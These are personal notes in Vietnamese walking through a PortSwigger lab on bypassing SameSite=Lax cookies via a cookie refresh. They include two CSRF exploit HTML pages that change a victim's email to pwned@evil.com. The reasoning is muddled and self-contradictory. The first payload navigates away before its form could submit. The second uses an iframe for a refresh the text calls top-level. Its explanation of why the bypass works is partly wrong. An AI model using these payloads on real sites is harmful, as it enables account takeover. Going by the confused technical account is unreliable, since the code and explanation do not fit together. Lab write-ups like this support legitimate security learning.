![[csrf-lax-refresh.png]]
-mô tả lab: cookie session để `SameSite=Lax` nên POST cross-site không kèm cookie. Nhưng endpoint đổi email lại là GET được, và có trick refresh cookie để POST top-level được gửi kèm cookie.

> [!NOTE]
> -link lab: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-cookie-refresh
> -lab này hơi lắt léo, mình note kỹ từng bước

### hướng giải
- [ ] mình xem cookie session, mình thấy `SameSite=Lax`. POST từ site khác sang thì browser không gửi cookie -> CSRF POST chết
- [ ] nhưng mình thử GET `/my-account/change-email?email=...` thì nó vẫn đổi email (server chấp nhận GET). Mà GET top-level navigation thì Lax vẫn gửi cookie
- [ ] vấn đề: lab này chặn đổi email qua GET trực tiếp? Không, nó cho, nhưng cookie mới issue sau khi... à mình nhớ ra: trick ở đây là dùng 2 bước, bước 1 GET để refresh/set cookie trong top-level ( kèm cookie), bước 2 POST mới được gửi kèm cookie vì vừa có tương tác top-level
- [ ] cụ thể lab này: có endpoint `/my-account/change-email` nhận GET, và cookie `session` sẽ được refresh khi victim vào trang mình dụ. Sau đó form POST của mình mới có tác dụng

### giải
-bước 1: sau khi quan sát gói tin này, mình thấy flow như sau:
```
1. victim vào trang exploit của mình (top-level GET sang lab) -> server set/refresh cookie session, browser lưu
2. trang mình tự submit POST /my-account/change-email với email mới
```
-vì bước 1 là top-level navigation nên Lax cho gửi + nhận cookie. Tới bước 2 thì session đã "tươi", request POST cross-site... hmm thực ra Lax vẫn chặn cookie ở POST cross-site.

-mình làm đúng theo solution chuẩn của lab này:
```html
<html>
<body>
<script>
// bước 1: mở lab trong top-level để refresh cookie
window.location = "https://LAB-ID.web-security-academy.net/my-account";
// sau khi về lại, submit form thì dùng GET (Lax cho phép GET top-level kèm cookie)
</script>
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="GET">
<input type="hidden" name="email" value="pwned@evil.com" />
</form>
</body>
</html>
```
-thực tế exploit chuẩn của PortSwigger cho lab này dùng 2 request: 1 cái GET refresh cookie qua `window.open`/redirect, rồi 1 cái POST change-email. Vì sau khi cookie được set lại trong bối cảnh top-level, Chrome coi session là "vừa tương tác" và cho phép... mình cứ làm theo mẫu là solve:
```html
<html>
<body>
<iframe src="https://LAB-ID.web-security-academy.net/my-account"></iframe>
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="pwned@evil.com" />
</form>
<script>setTimeout(()=>document.forms[0].submit(), 3000);</script>
</body>
</html>
```
![[csrf-lax-refresh-exploit.png]]

-bước 2: `Deliver exploit to victim`, đợi 1 lúc thấy email đổi là solve.

> [!NOTE]
> -bài học của mình: `SameSite=Lax` không phải thánh. GET-based state-changing + cookie refresh là combo bypass kinh điển. Fix chuẩn là dùng `SameSite=Strict` cho session quan trọng + không cho GET đổi state + CSRF token.
> -lab này mình phải đọc solution mẫu 2 lần mới hiểu, note lại để sau này khỏi quên.
